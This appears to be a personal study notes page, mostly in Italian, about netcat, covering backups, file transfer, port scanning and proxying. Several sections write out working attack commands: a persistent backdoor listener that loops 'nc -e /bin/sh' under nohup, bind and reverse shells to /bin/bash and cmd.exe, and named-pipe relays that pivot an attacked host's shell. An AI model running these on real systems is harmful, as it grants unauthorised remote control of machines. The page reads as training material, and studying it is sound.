@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="generator" content="markdown-it" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+        <meta name="author" content="runner" />
+        <meta name="dcterms.date" content="2025-04-08 13:38:20.004" />
+        <title>netcat</title>
+        <style type="text/css">
+            code {
+                white-space: pre-wrap;
+            }
+            span.smallcaps {
+                font-variant: small-caps;
+            }
+            span.underline {
+                text-decoration: underline;
+            }
+            div.column {
+                display: inline-block;
+                vertical-align: top;
+                width: 50%;
+            }
+        </style>
+        <style type="text/css">
+            a.sourceLine {
+                display: inline-block;
+                line-height: 1.25;
+            }
+            a.sourceLine {
+                pointer-events: none;
+                color: inherit;
+                text-decoration: inherit;
+            }
+            a.sourceLine:empty {
+                height: 1.2em;
+            }
+            .sourceCode {
+                overflow: visible;
+            }
+            code.sourceCode {
+                white-space: pre;
+                position: relative;
+            }
+            div.sourceCode {
+                margin: 1em 0;
+            }
+            pre.sourceCode {
+                margin: 0;
+            }
+            @media screen {
+                div.sourceCode {
+                    overflow: auto;
+                }
+            }
+            @media print {
+                code.sourceCode {
+                    white-space: pre-wrap;
+                }
+                a.sourceLine {
+                    text-indent: -1em;
+                    padding-left: 1em;
+                }
+            }
+            pre.numberSource a.sourceLine {
+                position: relative;
+                left: -4em;
+            }
+            pre.numberSource a.sourceLine::before {
+                content: attr(title);
+                position: relative;
+                left: -1em;
+                text-align: right;
+                vertical-align: baseline;
+                border: none;
+                pointer-events: all;
+                display: inline-block;
+                -webkit-touch-callout: none;
+                -webkit-user-select: none;
+                -khtml-user-select: none;
+                -moz-user-select: none;
+                -ms-user-select: none;
+                user-select: none;
+                padding: 0 4px;
+                width: 4em;
+                background-color: #ffffff;
+                color: #a0a0a0;
+            }
+            pre.numberSource {
+                margin-left: 3em;
+                border-left: 1px solid #a0a0a0;
+                padding-left: 4px;
+            }
+            div.sourceCode {
+                color: #1f1c1b;
+                background-color: #ffffff;
+            }
+            @media screen {
+                a.sourceLine::before {
+                    text-decoration: underline;
+                }
+            }
+            code span {
+                color: #1f1c1b;
+            } /* Normal */
+            code span.al {
+                color: #bf0303;
+                background-color: #f7e6e6;
+                font-weight: bold;
+            } /* Alert */
+            code span.an {
+                color: #ca60ca;
+            } /* Annotation */
+            code span.at {
+                color: #0057ae;
+            } /* Attribute */
+            code span.bn {
+                color: #b08000;
+            } /* BaseN */
+            code span.bu {
+                color: #644a9b;
+                font-weight: bold;
+            } /* BuiltIn */
+            code span.cf {
+                color: #1f1c1b;
+                font-weight: bold;
+            } /* ControlFlow */
+            code span.ch {
+                color: #924c9d;
+            } /* Char */
+            code span.cn {
+                color: #aa5500;
+            } /* Constant */
+            code span.co {
+                color: #898887;
+            } /* Comment */
+            code span.cv {
+                color: #0095ff;
+            } /* CommentVar */
+            code span.do {
+                color: #607880;
+            } /* Documentation */
+            code span.dt {
+                color: #0057ae;
+            } /* DataType */
+            code span.dv {
+                color: #b08000;
+            } /* DecVal */
+            code span.er {
+                color: #bf0303;
+                text-decoration: underline;
+            } /* Error */
+            code span.ex {
+                color: #0095ff;
+                font-weight: bold;
+            } /* Extension */
+            code span.fl {
+                color: #b08000;
+            } /* Float */
+            code span.fu {
+                color: #644a9b;
+            } /* Function */
+            code span.im {
+                color: #ff5500;
+            } /* Import */
+            code span.in {
+                color: #b08000;
+            } /* Information */
+            code span.kw {
+                color: #1f1c1b;
+                font-weight: bold;
+            } /* Keyword */
+            code span.op {
+                color: #1f1c1b;
+            } /* Operator */
+            code span.ot {
+                color: #006e28;
+            } /* Other */
+            code span.pp {
+                color: #006e28;
+            } /* Preprocessor */
+            code span.re {
+                color: #0057ae;
+                background-color: #e0e9f8;
+            } /* RegionMarker */
+            code span.sc {
+                color: #3daee9;
+            } /* SpecialChar */
+            code span.ss {
+                color: #ff5500;
+            } /* SpecialString */
+            code span.st {
+                color: #bf0303;
+            } /* String */
+            code span.va {
+                color: #0057ae;
+            } /* Variable */
+            code span.vs {
+                color: #bf0303;
+            } /* VerbatimString */
+            code span.wa {
+                color: #bf0303;
+            } /* Warning */
+        </style>
+        <!--
+  Firefox non carica font da locale quindi il font può non essere visibile
+  quando di carica la pagina da locale.
+  Bisogna impostare about:config
+    security.fileuri.strict_origin_policy = false
+  -->
+        <link rel="stylesheet" href="../../inc/css/katex.min.css" />
+        <link rel="stylesheet" href="../../inc/css/fonts/google_fonts.css" />
+        <!-- <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous"> -->
+        <link rel="stylesheet" href="../../inc/css/bootstrap.min.css" />
+        <link rel="stylesheet" href="../../inc/css/cdp.css" />
+        <!--[if lt IE 9]>
+            <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+        <![endif]-->
+        <meta name="keywords" content="Appunti,Note" />
+        <meta name="description" content="Appunti di runner" />
+        <link rel="icon" type="image/x-icon" href="../../inc/img/favicon.ico" />
+        <link rel="shortcut icon" type="image/x-icon" href="../../inc/img/favicon.ico" />
+
+        <link rel="stylesheet" href="../../inc/js/hljs/styles/default.css" />
+        <script src="../../inc/js/hljs/lib/highlight.js"></script>
+        <script src="../../inc/js/bootstrap/bootstrap.bundle.min.js"></script>
+        <!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script> -->
+        <script>
+            hljs.initHighlightingOnLoad();
+        </script>
+        <script type="module">
+            import mermaid from '../../inc/js/mermaid/dist/mermaid.esm.min.mjs';
+            // import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+            mermaid.initialize({ startOnLoad: true });
+        </script>
+    </head>
+    <body></body>
+</html>
+<h1 id="netcat" tabindex="-1">netcat <a class="header-anchor" href="#netcat" aria-hidden="true">🔗</a></h1>
+<p class="code">2025-04-08 13:38:20.004</p>
+<nav class="table-of-contents"><ol><li><a href="#netcat-port-scanning">netcat port scanning </a></li><li><a href="#netcat-per-effettuare-il-backup-in-rete">netcat per effettuare il backup in rete </a></li><li><a href="#netcat-persistent-backdoor-listeners">Netcat persistent backdoor listeners </a></li><li><a href="#nc-relays">nc relays </a></li><li><a href="#netcat's-many-uses">Netcat&#39;s Many Uses </a></li><li><a href="#netcat-con-dd">netcat con dd </a></li><li><a href="#combining-tar%2C-pigz%2C-and-netcat">Combining tar, pigz, and netcat </a></li><li><a href="#copying-large-amounts-of-data-over-network-by-using-help-of-nc-utility">Copying large amounts of data over network by using help of nc utility </a></li><li><a href="#netcat-can-be-used-as-a-replacement-of-telnet">netcat can be used as a replacement of telnet </a></li></ol></nav><h1 id="netcat-e-dd-per-trasferire-hard-disk-o-partizioni-tramite-la-rete" tabindex="-1">netcat e dd per trasferire hard disk o partizioni tramite la rete <a class="header-anchor" href="#netcat-e-dd-per-trasferire-hard-disk-o-partizioni-tramite-la-rete" aria-hidden="true">🔗</a></h1>
+<h2 id="netcat-port-scanning" tabindex="-1">netcat port scanning <a class="header-anchor" href="#netcat-port-scanning" aria-hidden="true">🔗</a></h2>
+<pre><code class="language-bash">$ nc -v -w3 -z localhost 1-65535
+</code></pre>
+<h2 id="netcat-per-effettuare-il-backup-in-rete" tabindex="-1">netcat per effettuare il backup in rete <a class="header-anchor" href="#netcat-per-effettuare-il-backup-in-rete" aria-hidden="true">🔗</a></h2>
+<p><a href="../comandi/backup/netcat_e_dd.html">netcat e dd</a></p>
+<h2 id="netcat-persistent-backdoor-listeners" tabindex="-1">Netcat persistent backdoor listeners <a class="header-anchor" href="#netcat-persistent-backdoor-listeners" aria-hidden="true">🔗</a></h2>
+<p>Con <code>-l</code> netcat ascolta una sola volta, quando il client termina anche il listener termina. <br>
+Come impedire a netcat di chiudersi quando viene chiuso il client, <br>
+Si puo rinchiudere il listener in un <strong>ciclo while infinito</strong> che lo ritiri sempre su. <br>
+Per consentire inoltre di chiudere la shell che ha lanciato il listener, inseriamo il ciclo while
+in un file eseguito con <code>nohup</code>.</p>
+<pre><code class="language-bash">$ <span class="hljs-built_in">cat</span> listener.sh
+<span class="hljs-keyword">while</span> [ 1 ]; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Started&quot;</span>; nc -l -p port -e /bin/sh; <span class="hljs-keyword">done</span>
+$ <span class="hljs-built_in">chmod</span> 555 listener.sh
+$ <span class="hljs-built_in">nohup</span> ./listener.sh &amp;
+</code></pre>
+<h2 id="nc-relays" tabindex="-1">nc relays <a class="header-anchor" href="#nc-relays" aria-hidden="true">🔗</a></h2>
+<p><strong>relay</strong>: inoltrare, ritrasmettere, passare</p>
+<pre><code class="language-bash"><span class="hljs-comment"># Per creare una pipe con nome</span>
+<span class="hljs-built_in">mkfifo</span> pipe
+<span class="hljs-built_in">mknod</span> pipe p
+
+<span class="hljs-variable">$1</span> nc -l -p 54321 -e /bin/bash <span class="hljs-comment"># macchina &quot;SERVER&quot; attaccata sulla quale viene aperta una shell</span>
+
+<span class="hljs-variable">$2</span> <span class="hljs-built_in">mkfifo</span> pipe
+<span class="hljs-variable">$2</span> nc -l -p 11111 &lt; pipe | <span class="hljs-built_in">tee</span> outgoing.log | nc 127.0.0.1 54321 | <span class="hljs-built_in">tee</span> pipe incoming.log <span class="hljs-comment"># relay che mette in comunicazione la shell nella macchina windows con la porta 11111 nella macchina linux</span>
+
+<span class="hljs-variable">$3</span> nc 127.0.0.1 11111        <span class="hljs-comment"># macchina &quot;CLIENT&quot; linux attaccante, può essere diversa dalla macchina relay</span>
+
+</code></pre>
+<p><code>nc -l -p 11111 &lt; pipe</code> mette netcat in ascolto sulla porta 11111 ed invia al client che si connette tuttò ciò che arriva dalla pipe <code>pipe</code>
+<code>| tee outgoing.log |</code>  stampa ciò che viene ricevuto dalla pipe sinistra su stdout e reinvia tutto alla pipe a destra, serve a stampare quello che passa nella pipe a scopo di debug
+<code>nc 127.0.0.1 54321</code>    questo è il server al quale ci si vuole connettere
+<code>tee pipe incoming.log</code> questo è cio che permette la comunicazione tra client e server bidirezionale per mezzo del proxy, l'ouput del server viene redirezionato nella pipe</p>
+<p><strong>relay</strong>: inoltrare, ritrasmettere, passare</p>
+<p>Per avere una comunicazione bidirezionale(la pipe è unidirezionale) utilizziamo due pipe, una senza nome | ed una con nome creata ad hoc:</p>
+<pre><code class="language-bash">$ <span class="hljs-built_in">mknod</span> backpipe p
+$ nc -l -p 2222 &lt; backpipe | nc 10.10.10.100 80 &gt; backpipe
+<span class="hljs-comment"># Attaccante:</span>
+$ nc localhost 2222
+
+$ nc -l -p 2222 | nc 10.10.10.100 80 
+<span class="hljs-comment"># in questo esempio la macchina relay si mette in ascolto sulla porta 2222, </span>
+<span class="hljs-comment"># tutto cio che riceve nella porta 2222 viene avanzato tramite la pipe senza nome al client nc verso il server 10.10.10.100.</span>
+<span class="hljs-comment"># La cosa funziona, ma la risposta ricevuta da 10.10.10.100 viene ricevuta solo dal relay, non dall&#x27;attaccante.</span>
+<span class="hljs-comment"># Nella versione completa con backpipe la risposta ricevuta dal serveer 10.10.10.100 viene scritta nella backpipe,</span>
+<span class="hljs-comment"># che a sua volta viene letta dal listener al quale l&#x27;attaccante si è agganciato.</span>
+
+<span class="hljs-comment"># Agganciare una shell senza opzione -e</span>
+$ <span class="hljs-built_in">mkfifo</span> backpipe
+$ /bin/bash &lt; backpipe | nc -l -p 8080 &gt; backpipe
+</code></pre>
+<h2 id="netcat's-many-uses" tabindex="-1">Netcat's Many Uses <a class="header-anchor" href="#netcat's-many-uses" aria-hidden="true">🔗</a></h2>
+<pre><code class="language-bash"><span class="hljs-comment"># Verify Connectivity</span>
+$ ping -c 3 10.10.0.1 <span class="hljs-comment"># $ : Linux</span>
+&gt; ping 10.10.75.1     <span class="hljs-comment"># &gt; : Windows</span>
+
+<span class="hljs-comment"># Simple Client and Listener &quot;Chat&quot;</span>
+$ nc -l -p 2222
+&gt; nc 10.10.75.1 2222
+
+<span class="hljs-comment"># Pull a File</span>
+&gt; <span class="hljs-built_in">echo</span> this is text &gt; text.txt
+&gt; nc -l -p 1234 &lt; text.txt			<span class="hljs-comment"># qui il server viene utilizzato per inviare</span>
+$ nc 10.10.0.1 1234 &gt; received.txt
+$ <span class="hljs-built_in">cat</span> received.txt 
+
+<span class="hljs-comment"># Push a File</span>
+$ <span class="hljs-built_in">echo</span> SANS &gt; file.txt
+&gt; nc -l -p 4321 &gt; received2.txt		<span class="hljs-comment"># qui il server viene utilizzato per ricevere</span>
+$ nc 10.10.0.1 4321 &lt; file.txt
+&gt; <span class="hljs-built_in">type</span> received2.txt
+
+<span class="hljs-comment"># Create a Linux Backdoor</span>
+$ nc -l -p 7777 -e /bin/sh
+&gt; nc 10.10.75.1 7777				<span class="hljs-comment"># con questo sistema il prompt non viene visualizzato</span>
+	<span class="hljs-built_in">whoami</span>
+	<span class="hljs-built_in">id</span>
+	<span class="hljs-built_in">pwd</span>
+
+<span class="hljs-comment"># Reverse Windows Shell</span>
+$ nc -l -p 8888						<span class="hljs-comment"># questa volta il prompt viene visualizzato</span>
+&gt; nc 10.10.75.1 8888 -e cmd.exe		<span class="hljs-comment"># shell shoveling</span>
+	<span class="hljs-built_in">echo</span> %username%
+	<span class="hljs-built_in">dir</span>
+	hostname
+	
+<span class="hljs-comment"># Create Linux Relay - relay: inoltrare, ritrasmettere, passare</span>
+&gt; nc -l -p 54321 -e cmd.exe <span class="hljs-comment"># macchina windows attaccata sulla quale viene aperta una shell</span>
+named pipe
+$ <span class="hljs-built_in">mkfifo</span> backpipe
+$ nc -l -p 11111 &lt;backpipe | nc 10.10.0.1 54321 &gt;backpipe <span class="hljs-comment"># relay che mette in comunicazione la shell nella macchina windows con la porta 11111 nella macchina linux</span>
+$ nc 127.0.0.1 11111        <span class="hljs-comment"># macchina linux attaccante</span>
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+C:\Users\Sec504&gt;
+<span class="hljs-built_in">whoami</span>
+hostname
+$ <span class="hljs-built_in">rm</span> backpipe
+</code></pre>
+<blockquote>
+<p>nc -l -p 54321 -e cmd.exe                                 # Windows
+$ nc -l -p 11111 &lt;backpipe | nc 10.10.0.1 54321 &gt;backpipe   # Linux
+La pipe è un meccanismo di comunicazione unidirezionale, ha una estremità in scrittura ed una in lettura,
+man 7 pipe
+man mkfifo
+per avere una comunicazione bidirezionale tra shell attaccante $ e shell attaccata &gt; si utilizzano assieme
+una pipe unnamed | ed una named: backpipe
+la pipe unnamed | permette di veicolare i comandi dati dalla shell linux nella shell windows
+la pipe backpipe permette di ricevere in linux l'output generato dalla shell windows</p>
+</blockquote>
+<h2 id="netcat-con-dd" tabindex="-1">netcat con dd <a class="header-anchor" href="#netcat-con-dd" aria-hidden="true">🔗</a></h2>
+<pre><code class="language-bash"><span class="hljs-built_in">sudo</span> apt-get install netcat
+</code></pre>
+<p>Dobbiamo trasferire il file hdb-appoggio.img dalla macchina PC1 alla macchina PC2</p>
+<p>Impostiamo un indirizzo di rete fisso per entrami i pc:</p>
+<pre><code class="language-bash">PC1# ifconfig eth0 10.10.10.10 up
+PC2#ifconfig eth0 10.10.10.20 up
+</code></pre>
+<p>Accertiamoci che i pc si vedano:</p>
+<pre><code class="language-bash">PC1# ping -c 8 10.10.10.20
+PC2# nc -l -p 7000|<span class="hljs-built_in">dd</span> of=hdb-appoggio.img <span class="hljs-comment"># Netcat si mette in attesa sulla porta 7000 e quando i dati arriveranno li passera a dd</span>
+PC1# <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=hdb-appoggio.img | nc 10.10.10.20 7000 -q 5# <span class="hljs-built_in">dd</span> invia a Netcat i dati
+
+<span class="hljs-comment"># -p 7000 : Specifies the source port nc should use, subject to privilege restrictions and availability. Make sure port 7000 is not used by another process.</span>
+<span class="hljs-comment"># -l : Used to specify that nc should listen for an incoming connection rather than initiate a connection to a remote host.</span>
+</code></pre>
+<p>Our sample setup</p>
+<pre><code>-----------------------
+HostA // 192.168.1.1
+------------------------
+sda
+NETWORK
+sdb
+------------------------
+HostB // 192.168.1.2
+-------------------------
+</code></pre>
+<p>Your task is copy <code>HostA</code> <code>/dev/sda</code> to <code>HostB</code>'s <code>/dev/sdb</code> using netcat command. First login as root user</p>
+<p>Command to type on hostB (receiving end ~ write image mode)</p>
+<p>You need to open port on hostB using netcat, enter :</p>
+<pre><code class="language-bash">netcat -p 2222 -l |bzip2 -d | <span class="hljs-built_in">dd</span> of=/dev/sdb bs=16M
+</code></pre>
+<p>Where,</p>
+<ul>
+<li>-p 2222 : Specifies the source port nc should use, subject to privilege restrictions and availability. Make sure port 2222 is not used by another process.</li>
+<li>-l : Used to specify that nc should listen for an incoming connection rather than initiate a connection to a remote host.</li>
+<li>bzip2 -d : Compresses image using the Burrows-Wheeler block sorting text compression algorithm, and Huffman coding. This will speed up network transfer ( -d : force decompression mode)</li>
+<li>dd of=/dev/sdb : /dev/sdb is your hard disk. You can also specify partition such as /dev/sdb1</li>
+</ul>
+<p>Command to type on hostA (send data over a network ~ read image mode)</p>
+<p>Now all you have to do is start copying image. Again login as root and enter:</p>
+<pre><code class="language-bash">bzip2 -c /dev/sda | netcat hostB 2222
+</code></pre>
+<p><span class="u">A note about latest netcat version 1.84-10 and above</span></p>
+<p>If you are using latest nc/netcat version <span class="u b">above syntax will generate an error</span>.
+<span class="mrb">It is an error to use -l option in conjunction with the -p, -s, or -z options</span>.Additionally, any timeouts specified with the -w option are ignored. So use nc command as follows.</p>
+<p>Using a second machine (hostB), connect to the listening nc process at 2222 (hostA), feeding it the file (/dev/sda)which is to be transferred. You can use bzip2 as follows.</p>
+<p>On hostB, enter:</p>
+<pre><code class="language-bash">nc -l 2222 | bzip2 -d &gt; /dev/sdb
+</code></pre>
+<p>On hostA, enter:</p>
+<pre><code class="language-bash">bzip2 -c /dev/sda | nc HostB 2222
+</code></pre>
+<pre><code class="language-bash"><span class="hljs-comment"># BACKUP - to backupserver (192.168.1.1)</span>
+nc -p 2222 -l | bzip2 -c &gt; Image.bz2
+<span class="hljs-comment"># BACKUP - from clienthost (192.168.1.2)</span>
+<span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/sda bs=16M | nc 192.168.1.1 2222
+<span class="hljs-comment"># RESTORE - to clienthost (192.168.1.2)</span>
+nc -p 2222 -l &gt; /dev/sda
+<span class="hljs-comment"># RESTORE - from backupserver (192.168.1.1)</span>
+<span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=Image.bz2 bs=16M | bunzip2 -c | nc 192.168.1.2 2222
+</code></pre>
+<h2 id="combining-tar%2C-pigz%2C-and-netcat" tabindex="-1">Combining tar, pigz, and netcat <a class="header-anchor" href="#combining-tar%2C-pigz%2C-and-netcat" aria-hidden="true">🔗</a></h2>
+<p>Typically used scp to transfer files around. But more frequently, for faster results, I find myself using a combo of tar + pigz + netcat, especially when transferring larger amounts of data.
+Here’s how to run tar + pigz + netcat. On the source server, use netcat to open up a listening socket (arbitrary port) which reads data from stdin and pipe to it a compressed mysql directory using pigz (parallel gzip):</p>
+<pre><code class="language-bash">tar -c /var/lib/mysql | pigz -5 | nc -l 8888
+</code></pre>
+<p>Then, on the destination server, connect to the source host using your predetermined port to retrieve your data and since it’s being compressed just before transfer, pipe it to gunzip/tar to unzip/unpackage your data:</p>
+<pre><code class="language-bash">$ time nc remote_ip 8888 | gunzip | tar xvf -
+real 3m7.497s
+user 2m49.143s
+sys 1m5.727s
+$ <span class="hljs-built_in">du</span> -sk var/lib/mysql/.
+15256984 var/lib/mysql/.
+</code></pre>
+<p>Thats it! And since netcat doesn’t give a status bar, add pv (pipe viewer) into the mix on the source server to monitor its progress (note: replace single quotes with backticks):</p>
+<pre><code class="language-bash">$ tar -c /var/lib/mysql | pv --size `<span class="hljs-built_in">du</span> -sh /var/lib/mysql/. | <span class="hljs-built_in">cut</span> -f1` | pigz -5 | nc -l 8888
+14.5GB 0:03:12 [77.1MB/s] [===================================&gt; ] 96%
+</code></pre>
+<p>For comparison, here’s how long it took to scp the same directory between the two hosts:</p>
+<pre><code class="language-bash">$ time scp -r remote_ip:/var/lib/mysql .
+real 6m18.126s
+user 5m27.889s
+sys 1m18.041s
+$ <span class="hljs-built_in">du</span> -sk mysql/.
+15256984 mysql/.
+</code></pre>
+<h2 id="copying-large-amounts-of-data-over-network-by-using-help-of-nc-utility" tabindex="-1">Copying large amounts of data over network by using help of nc utility <a class="header-anchor" href="#copying-large-amounts-of-data-over-network-by-using-help-of-nc-utility" aria-hidden="true">🔗</a></h2>
+<p>Suppose you have two computers A and B.
+You want to transfer a directory from A to B very quickly. The fastest way is to use tar and nc, and time the operation with pv.</p>
+<p>on computer A, with IP address 192.168.1.100</p>
+<pre><code class="language-bash">$ tar -cf - /path/to/dir | pv | nc -l -p 6666 -q 5
+</code></pre>
+<p>on computer B</p>
+<pre><code class="language-bash">$ nc 192.168.1.100 6666 | pv | tar -xf -
+</code></pre>
+<p>That's it. All the files in /path/to/dir on computer A will get transferred to computer B, and you?ll be able to see how fast the operation is going.</p>
+<p>If you want the progress bar, you have to do the ?pv -s $(?)? trick from the previous example (only on computer A).</p>
+<h2 id="netcat-can-be-used-as-a-replacement-of-telnet" tabindex="-1">netcat can be used as a replacement of telnet <a class="header-anchor" href="#netcat-can-be-used-as-a-replacement-of-telnet" aria-hidden="true">🔗</a></h2>
+<pre><code class="language-bash">$ nc www.google.com 80
+</code></pre>
+<p>It's actually much more handy than the regular telnet because you can terminate the connection at any time with ctrl+c, and it handles binary data as regular data (no escape codes, nothing).</p>
+<p>You may add -v parameter for more verboseness, and two -v's (-vv) to get statistics of how many bytes were transmitted during the connection.</p>
+<p>Netcat can also be used as a server itself. If you start it as following, it will listen on port 12345 (on all interfaces):</p>
+<pre><code class="language-bash">$ nc -l -p 12345
+</code></pre>
+<p>If you now connect to port 12345 on that host, everything you type will be sent to the other party, which leads us to using netcat as a chat server. Start the server on one computer:</p>
+<p>On a computer A with IP 10.10.10.10</p>
+<pre><code class="language-bash">$ nc -l -p 12345
+</code></pre>
+<p>And connect to it from another:</p>
+<p>On computer B</p>
+<pre><code class="language-bash">$ nc 10.10.10.10 12345
+</code></pre>
+<p>Now both parties can chat!</p>
+<p>Talking of which, the chat can be turned to make two processes talk to each other, thus making nc do I/O over network! For example, you can send the whole directory from one computer to another by piping tar to nc on the first computer, and redirecting output to another tar process on the second.</p>
+<p>Suppose you want to send files in /data from computer A with IP 192.168.1.10 to computer B (with any IP). It's as simple as this:</p>
+<p>On computer A with IP 192.168.1.10</p>
+<pre><code class="language-bash">$ tar -cf - /data | nc -l -p 6666
+</code></pre>
+<p>On computer B</p>
+<pre><code class="language-bash">$ nc 192.168.1.10 6666 | tar -xf -
+</code></pre>
+<p>Don't forget to combine the pipeline with pipe viewer from previous article in this series to get statistics on how fast the transfer is going!</p>
+<p>A single file can be sent even easier:</p>
+<p>On computer A with IP 192.168.1.10</p>
+<pre><code class="language-bash">$ <span class="hljs-built_in">cat</span> file | nc -l -p 6666
+</code></pre>
+<p>On computer B</p>
+<pre><code class="language-bash">$ nc 192.168.1.10 6666 &gt; file
+</code></pre>
+<p>You may even copy and restore the whole disk with nc:</p>
+<p>On computer A with IP 192.168.1.10</p>
+<pre><code class="language-bash">$ <span class="hljs-built_in">cat</span> /dev/hdb | nc -l -p 6666
+</code></pre>
+<p>On computer B</p>
+<pre><code class="language-bash">$ nc 192.168.1.10 6666 &gt; /dev/hdb
+</code></pre>
+<p>Note: It turns out that &quot;-l&quot; can't be used together with &quot;-p&quot; on a Mac! The solution is to replace &quot;-l -p 6666&quot; with just &quot;-l 6666&quot;. Like this:</p>
+<pre><code class="language-bash">$ nc -l 6666
+</code></pre>
+<p>nc now listens on port 6666 on a Mac computer</p>
+<p>An uncommon use of netcat is port scanning. Netcat is not the best tool for this job, but it does it ok (the best tool is nmap):</p>
+<pre><code class="language-bash">$ nc -v -n -z -w 1 192.168.1.2 1-1000
+(UNKNOWN) [192.168.1.2] 445 (microsoft-ds) open
+(UNKNOWN) [192.168.1.2] 139 (netbios-ssn) open
+(UNKNOWN) [192.168.1.2] 111 (sunrpc) open
+(UNKNOWN) [192.168.1.2] 80 (www) open
+(UNKNOWN) [192.168.1.2] 25 (smtp) : Connection timed out
+(UNKNOWN) [192.168.1.2] 22 (ssh) open
+</code></pre>
+<p>The &quot;-n&quot; parameter here prevents DNS lookup, &quot;-z&quot; makes nc not to receive any data from the server, and &quot;-w 1&quot; makes the connection timeout after 1 second of inactivity.</p>
+<p>Another uncommon behavior is using netcat as a proxy. Both ports and hosts can be redirected. Look at this example:</p>
+<pre><code class="language-bash">$ nc -l -p 12345 | nc www.google.com 80
+</code></pre>
+<p>This starts a nc server on port 12345 and all the connections get redirected to <a href="http://google.com:80">google.com:80</a>. If you now connect to that computer on port 12345 and do a request, you will find that no data gets sent back. That's correct, because we did not set up a bidirectional pipe. If you add another pipe, you can get the data back on another port:</p>
+<pre><code class="language-bash">$ nc -l -p 12345 | nc www.google.com 80 | nc -l -p 12346
+</code></pre>
+<p>After you have sent the request on port 12345, connect on port 12346 to get the data.</p>
+<p>Probably the most powerful netcat?s feature is making any process a server:</p>
+<pre><code class="language-bash">$ nc -l -p 12345 -e /bin/bash
+</code></pre>
+<p>The &quot;-e&quot; option spawns the executable with it's input and output redirected via network socket. If you now connect to the host on port 12345, you may use bash:</p>
+<pre><code class="language-bash">$ nc localhost 12345
+<span class="hljs-built_in">ls</span> -las
+total 4288
+4 drwxr-xr-x 15 pkrumins <span class="hljs-built_in">users</span> 4096 2009-02-17 07:47 .
+4 drwxr-xr-x 4 pkrumins <span class="hljs-built_in">users</span> 4096 2009-01-18 21:22 ..
+8 -rw------- 1 pkrumins <span class="hljs-built_in">users</span> 8192 2009-02-16 19:30 .bash_history
+4 -rw-r--r-- 1 pkrumins <span class="hljs-built_in">users</span> 220 2009-01-18 21:04 .bash_logout
+...
+</code></pre>
+<p>The consequences are that nc is a popular hacker tool as it is so easy to create a backdoor on any computer. On a Linux computer you may spawn /bin/bash and on a Windows computer cmd.exe to have total control over it.</p>
+</body></html>
